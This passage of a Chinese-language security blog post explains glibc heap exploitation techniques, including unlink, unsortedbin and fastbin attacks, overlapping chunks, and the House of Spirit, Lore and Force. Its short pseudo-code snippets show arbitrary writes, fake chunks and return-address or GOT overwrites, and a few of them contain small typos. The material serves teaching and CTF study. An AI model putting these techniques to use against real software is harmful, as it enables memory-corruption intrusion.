<p>现在言归正传，来看看 unlink 漏洞。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#define unlink(P, BK, FD) &#123;</div><div class="line">FD = P-&gt;fd;</div><div class="line">BK = P-&gt;bk;</div><div class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))</div><div class="line">malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P);</div><div class="line">else &#123;</div><div class="line">FD-&gt;bk = BK;</div><div class="line">BK-&gt;fd = FD;</div></pre></td></tr></table></figure>
<p>上面所示是 unlink 宏的主要实现，我们现在设想申请两个chunk，并利用第一个chunk溢出到第二个chunk的size位，将第一个chunk的 inuse 位改写为 free状态，这时候我们再free第二个chunk，此时系统通过第二个chunk的size检查第一个chunk，发现他是free状态，那么这时候就会使用unlink将第一块chunk从bin中释放出来并与第二块合并</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a = malloc(0x20)</div><div class="line">b = malloc(0x20) // b.size = 0x20 + chunk_header | inuse(0x01) == 0x31</div><div class="line">a[0x20+4] = 0x30 // 覆盖 inuse 位</div><div class="line">free(b) // 检查inuse位，发现 a 为 free，执行 unlink，合并两个 chunk</div></pre></td></tr></table></figure>
<p>这时候其实a并没有在 bin 中，但是如果我们对 a 的前两个元素（即”fd”、”bk”）进行构造，那么就可以造成任意地址写入。</p>
<p>首先我们需要绕过检查,我们进行一个小小的计算(下面的栗子是64位系统)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">P-&gt;bk-&gt;fd == P //64位 [P+0x18]+0x10 == P  &lt;=&gt;  [P+0x18] == P-0x10  &lt;=&gt;  BK == P-0x10</div><div class="line">			   //32位 [P+0xC]+0x8 == P   &lt;=&gt;   [P+0xC] == p-0x8  &lt;=&gt;  BK == P-0x8</div><div class="line">P-&gt;fd-&gt;bk == P //64位 [P+0x10]+0x18 == P  &lt;=&gt;  [P+0x10] == P-0x18  &lt;=&gt;  FD == P-0x18</div><div class="line">			   //32位 [P+0x8]+0xC == P   &lt;=&gt;   [P+0x8] == P-0xC  &lt;=&gt;  FD == P-0xC</div></pre></td></tr></table></figure>
<p>发现我们只需要在 b 的”fd”指针处放入 b-0×18,在”bk”指针处放入 b-0×10,即可绕过检查</p>
<p>执行完 unlink宏后，我们的b变成了这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">FD-&gt;bk = BK   //64 *P = P - 0x10</div><div class="line">			  //32 *p = p - 0x8</div><div class="line">BK-&gt;fd = FD   //64 *P = P - 0x18 // 这一步覆盖上一步</div><div class="line">			  //32 *p = p - 0xc</div><div class="line">计算流程：</div><div class="line">FD-&gt;bk = BK	</div><div class="line">	&lt;=&gt; (P-0x18)-&gt;bk = P-0x10</div><div class="line">	&lt;=&gt; [(P-0x18)+0x18] = P-0x10</div><div class="line">	&lt;=&gt; [P] = P-0x10</div><div class="line">	&lt;=&gt; *P = P-0x10</div><div class="line">同理，算出</div><div class="line">BK-&gt;fd = FD</div><div class="line">	&lt;=&gt; *P = P - 0x18</div></pre></td></tr></table></figure>
<p>也就是说 现在 b 处存放着 b-0×18 的地址，这时候我们再向 b 写入数据也就是向 b-0×18 处写入数据了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">--------|-------|</div><div class="line">    b   |       |----</div><div class="line">--------|-------|    |</div><div class="line">  ····· |       |    |</div><div class="line">--------|-------|    |</div><div class="line"> b-0x18 |       |&lt;---</div><div class="line">--------|-------|</div></pre></td></tr></table></figure>
<p>这时候我们通过两次写入来造成任意地址写入(假设我们能够写[b]的值，而且没有长度限制)</p>
<p>第一次写入0×18个字节，最后几位放入要写入的地址（此时覆盖了b）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">--------|-------|      |-------|</div><div class="line">    b   |address|----&gt; |  写入 |</div><div class="line">--------|-------|      |-------|</div><div class="line">  ····· |       |</div><div class="line">--------|-------|</div><div class="line"> b-0x18 | AAAA  |</div><div class="line">--------|-------|</div></pre></td></tr></table></figure>
<p>我们再次写入时，就是修改该地址处的数据了，比如修改got表什么的（此时是对上一次写入的地址进行任意修改）</p>
<h2 id="0×03-unsortedbin-attack"><a href="#0×03-unsortedbin-attack" class="headerlink" title="0×03 unsortedbin attack"></a>0×03 unsortedbin attack</h2><p>对 unsortedbin 的攻击主要利用从 unsortedbin 中取出 chunk 的操作来进行向任意位置写入一个不可控的指针,注意这里，从unsortedbin链表中取出chunk并不是使用unlink宏，所以不需要绕过 unlink 检查。首先我们需要创建两个 chunk 来避免 free 第一个 chunk 时将该 chunk 并入 top chunk(因为不连续，所以不会被合并),并且第一个 chunk 要足够大，确保其能进入到 unsortedbin中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p = malloc(0x400)</div><div class="line">malloc(0x200)</div></pre></td></tr></table></figure>
<p>然后将 p free掉，此时 p 进入到 unsortedbin中,然后改写其的 bk 指针,并malloc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">free(p)</div><div class="line">p[1] = 0xdeadbeef-0x10 // 任意地址 - 0x10</div><div class="line">malloc(0x400)</div></pre></td></tr></table></figure>
<p>我们看一下从 unsortedbin 中取出 chunk 的操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">victim = unsorted_chunks(av)-&gt;bk // victim为free掉的p</div><div class="line">bck = victim-&gt;bk;  // bck 为 任意地址 -0x10</div><div class="line">unsorted_chunks(av)-&gt;bk = bck; // 调整链表</div><div class="line">bck-&gt;fd = unsorted_chunks(av); //  任意地址 -0x10 + 0x10 = unsortedbin</div></pre></td></tr></table></figure>
<p>这个漏洞自由度较小，不过可以用来修改一些阈值，例如更改libc中的max_fast，从而使得任意分配都使用fastbin来实现，为其他漏洞提供方便。</p>
<h2 id="0×04-fastbin-attack"><a href="#0×04-fastbin-attack" class="headerlink" title="0×04 fastbin attack"></a>0×04 fastbin attack</h2><p>还记不记得我们在第一篇中那个介绍 fastbin 中 dobule free的例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">int main() &#123;</div><div class="line">    char *a=malloc(24);</div><div class="line">    char *b=malloc(24);</div><div class="line">    free(a);</div><div class="line">    free(b);</div><div class="line">    free(a);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个运行是没有问题的，但是想象一下，这样做之后，现在的 fastbin 中是什么样子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"> -------     -------     -------     -------    -------</div><div class="line">| 头结点 |-&gt; |   a2  |-&gt; |   b1  |-&gt; |   a1  |-&gt;|  null |</div><div class="line"> -------     -------     -------     -------    -------</div></pre></td></tr></table></figure>
<p>其中的指向关系由chunk的 fd 指针标识。此时我们再从 fastbin中 malloc 出一个 chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c = malloc(24);</div></pre></td></tr></table></figure>
<p>此时的 fastbin</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"> -------     -------     -------     -------</div><div class="line">| 头结点 |-&gt; |   b1  |-&gt; |   a1  |-&gt; |  null |</div><div class="line"> -------     -------     -------     -------</div></pre></td></tr></table></figure>
<p>现在我们得到了一个chunk，并且这个 chunk 同时在 fastbin中也存在，那么此时如果我们修改 c 的 fd 指针位置为任意地址，那么 fastbin 中 a 的指向也会发生改变</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"> -------     -------     -------     -------</div><div class="line">| 头结点 |-&gt; |   b1  |-&gt; |   a1  |-&gt; |任意地址|</div><div class="line"> -------     -------     -------     -------</div></pre></td></tr></table></figure>
<p>我们之后连续 malloc 两次</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">malloc(24);</div><div class="line">malloc(24);</div></pre></td></tr></table></figure>
<p>现在的 fastbin</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"> -------     -------</div><div class="line">| 头结点 |-&gt; |任意地址|</div><div class="line"> -------     -------</div></pre></td></tr></table></figure>
<p>那我们再次 malloc 时，就可以在任意地址创建一个 chunk 了，但是要注意的是，我们在之前提到过，从 fastbin 中取出 chunk 的时候会对 chunk 的size 做检查，也就是这个任意位置的 chunk 的 size 位必须构造。我们可以在栈中构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int stack = 0x30 // 24 + header = 0x28 ，0x10 对齐后 0x30</div></pre></td></tr></table></figure>
<p>这个变量作为size位，我们可以将任意地址填充为 &amp;stack – 8，然后 malloc 之后会返回这个地址的 chunk，在栈中变量无法溢出时，我们可以向 chunk 里面写入数据来造成栈溢出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">d = malloc(24);</div><div class="line">d[20] = 0xdeadbeef //控制rip, 此处的20并不是唯一的，依据具体情况而定</div></pre></td></tr></table></figure>
<p>fastbin attack 中令人兴奋的一点是，它不需要对 chunk 进行溢出就可以进行攻击，这在一些对输入长度检查严格的地方可以得到奇妙的应用。</p>
<h2 id="0×05-overlapping-chunk-1"><a href="#0×05-overlapping-chunk-1" class="headerlink" title="0×05 overlapping chunk 1"></a>0×05 overlapping chunk 1</h2><p>幸运的是，并不是所有的程序都会对输入长度有严格的约束，当我们能够溢出到下一个 chunk 时，我们可以修改它的 size 位来造成 chunk 的覆盖。</p>
<p>首先，我们创建三个chunk,考虑 prev_size 的复用和 0x10字节对齐，我们将 malloc(0x100-8), 系统会给我们(0x100-8)+0x10-0×8,即0x100(0x10对齐)的空间，实际可用的空间正好是0x100-8，并没有多分配，而要是malloc(0x100)的话，你会看到实际可用的空间是0x108（这个不是必须的，只是向大家强调一下 chunk 大小的计算）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">a = malloc(0x100-8);</div><div class="line">b = malloc(0x100-8);</div><div class="line">c = malloc(0x100-8);</div></pre></td></tr></table></figure>
<p>然后 free 掉 b，b就会放到 unsortedbin 中 ，这个bin只有一个链表，并不对size进行区分，所以我们可以放入0x100的chunk，修改为size为0x180后就可以拿出0x180的chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">free(b);</div></pre></td></tr></table></figure>
<p>然后我们利用a溢出到b的size位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*(a+0xf8) = 0x181 // 0x01标识a为inuse状态</div></pre></td></tr></table></figure>
<p>现在我们malloc一个0×180的 chunk，系统就会将从b开始的0×180大小的空间返还，这其中包括c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">d = malloc(0x180-8);</div></pre></td></tr></table></figure>
<p>ok，现在我们就可以更改利用d更改c中的内容，如果c中包含某个函数指针，我们也可以去改变它.</p>
<h2 id="0×06-overlapping-chunk-2"><a href="#0×06-overlapping-chunk-2" class="headerlink" title="0×06 overlapping chunk 2"></a>0×06 overlapping chunk 2</h2><p>我们在前面先释放再修改size来获得了一个覆盖掉后面chunk 的 chunk，那么如果我们先修改size为一个大值，然后free会怎样呢？</p>
<p>首先我们创建4个chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a = malloc(0x100-8);</div><div class="line">b = malloc(0x100-8);</div><div class="line">c = malloc(0x100-8);</div><div class="line">d = malloc(0x100-8);// 第四个为了防止被top chunk 合并，以及应对 free的检查</div></pre></td></tr></table></figure>
<p>我们通过a溢出到b的size</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*(a+0xf8) = 0x201 // 0x1为inuse标识</div></pre></td></tr></table></figure>
<p>我们这里讲b的size扩大到了c，由于free时需要检查下一个chunk的size，所以我们预留了d，并且防止free后直接与top chunk合并，之后我们free掉b，然后再次malloc就又包括了c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">free(p);</div><div class="line">e = malloc(0x200-8);</div></pre></td></tr></table></figure>
<p>然后就可以可以像0×02一样去利用。</p>
<h2 id="0×07-House-of-spirit"><a href="#0×07-House-of-spirit" class="headerlink" title="0×07 House of spirit"></a>0×07 House of spirit</h2><p>假设我们可以在栈上伪造出一个chunk结构，那么我们可不可以利用free来释放，再次malloc得到这个chunk呢？House of spirit就是这个思路，当我们在栈上伪造出 chunk，并绕过检查的话，那么就可以实现</p>
<p>首先我们需要伪造chunk，但是要记住，在free执行的时候，会有一步检查，检查下一个chunk的size是否大于2*sizeof(size_t)，并且小于所有分配的空间，所以我们需要构造两个size位。</p>
<p>我们假设栈上有一个数组可以填充数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">unsigned long long fake_chunks[10];</div></pre></td></tr></table></figure>
<p>我们开始构造要free的chunk的size</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fake_chunks[1] = 0x40;</div></pre></td></tr></table></figure>
<p>然后为了绕过检查，需要在这个chunk后面紧跟一个chunk，设置其size位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fake_chunks[9] = 0x1234; // 0x40/sizeof(unsigned long long) = 8</div></pre></td></tr></table></figure>
<p>然后我们把 fake_chunks[2] 的地址作为参数调用free。<font volor="#f00">堆块中，size的下一位为malloc返回的地址</font></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">free(&amp;fake_chunk[2]);// size的下一位为malloc返回的地址</div></pre></td></tr></table></figure>
<p>此时再进行malloc就可以得到该处的chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">p = malloc(0x30) // 根据 chunk size 计算公式 小于 0x38 即可 (0x38+0x10-0x08)(0x10对齐)</div></pre></td></tr></table></figure>
<h2 id="0×08-House-of-lore"><a href="#0×08-House-of-lore" class="headerlink" title="0×08 House of lore"></a>0×08 House of lore</h2><p>在前面的 House of spirit 中，我们尝试在栈上伪造了一个 chunk，那么接下来在 House of lore 中，我们将尝试伪造一条 smallbin链表，注意看，这里会用到我们在第一篇中讲过的 malloc分配流程的内容。</p>
<p>首先我们需要创建两个chunk，第一个用于进入smallbin中，第二个用来防止free后被top chunk合并</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">victim = malloc(100) // size 位于 smallbin 范围内</div><div class="line">malloc(1000) //防止free后被top chunk合并</div></pre></td></tr></table></figure>
<p>接下来我们要将这个 victim 送入 smallbin 中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">free(victim);</div></pre></td></tr></table></figure>
<p>我们先将其free掉，现在它位于unsortedbin中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">malloc(1200);</div></pre></td></tr></table></figure>
<p>接下来，我们再次申请一个size位于largebin中，并且在unsortedbin中没有与其匹配的chunk，所以我们需要一个大值。</p>
<p>设想一下，接下来会发生什么？</p>
<p>系统依次找完 fastbin、smallbin、unsortedbin后发现找不到这个size的chunk，接下来会把unsortedbin中的chunk加入到smallbin或者largebin中，这时，我们的victim就成功进入smallbin中了。</p>
<p>现在我们假设可以控制 victim的fd、bk指针，我们就可以在栈上伪造出一个smallbin的链表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">    intptr_t* stack_buffer_1[4] = &#123;0&#125;;	 // 堆1</div><div class="line">    intptr_t* stack_buffer_2[3] = &#123;0&#125;;	 // 堆2</div><div class="line">    intptr_t *victim_chunk = victim-2;   // 堆块位置</div><div class="line">    stack_buffer_1[0] = 0;</div><div class="line">    stack_buffer_1[1] = 0;</div><div class="line">    stack_buffer_1[2] = victim_chunk;</div><div class="line">    stack_buffer_1[3] = (intptr_t*)stack_buffer_2;</div><div class="line">    stack_buffer_2[2] = (intptr_t*)stack_buffer_1;</div><div class="line">    victim[1] = (intptr_t)stack_buffer_1;</div><div class="line">    </div><div class="line">    </div><div class="line">[victim]&lt;---| |-&gt;[stack_buffer_1]&lt;--| |--&gt;[stack_buffer_2]</div><div class="line">[  fd  ]	|-|--[      fd      ]   |-|---[      fd      ]</div><div class="line">[  bk  ]------|  [      bk      ]-----|   [      bk      ]</div></pre></td></tr></table></figure>
<p>那么我们再次malloc时，就可以从smallbin的链表末尾取chunk了。这里应该是stack_buffer_2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">void *p3 = malloc(100);</div></pre></td></tr></table></figure>
<p>而当我们在栈上创造出 chunk 后，就可以向chunk中写入来覆盖返回地址控制eip，甚至绕过 canary检查。</p>
<h2 id="0×09-House-of-force"><a href="#0×09-House-of-force" class="headerlink" title="0×09 House of force"></a>0×09 House of force</h2><p>在 House of force 中，我们这样设想，如果我们能够将top chunk的size覆盖为一个巨大的值，是否就可以实现malloc从堆直接到.bss段、到栈？</p>
<p>我们首先创建一个 chunk，紧跟着这个chunk的就是top chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">p = malloc(0x100-8);</div></pre></td></tr></table></figure>
<p>我们设法溢出到top chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*(p+0xf8) = -1;</div></pre></td></tr></table></figure>
<p>那么现在top chunk 的size 就是 0xffffffffffffffff，现在我们可以计算一下从top chunk的起始地址到我们要覆盖的地址之间的距离，然后malloc一个巨大的chunk填充这一段距离，然后再次malloc一个小chunk，向小chunk中写入数据就可以改变这里的值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">malloc(big_size);</div><div class="line">q = malloc(100);</div><div class="line">*q = &quot;hello world&quot;;</div></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/me.jpg"
               alt="Introspelliam" />
          <p class="site-author-name" itemprop="name">Introspelliam</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
           
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
            
              <a href="/archives/">
            
                <span class="site-state-item-count">133</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">16</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">55</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/Introspelliam" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                    
                      GitHub
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/u/3008590672" target="_blank" title="Weibo">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                    
                      Weibo
                    
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Introspelliam</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>

  <span class="post-meta-divider">|</span>

  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  

  
    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  










  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

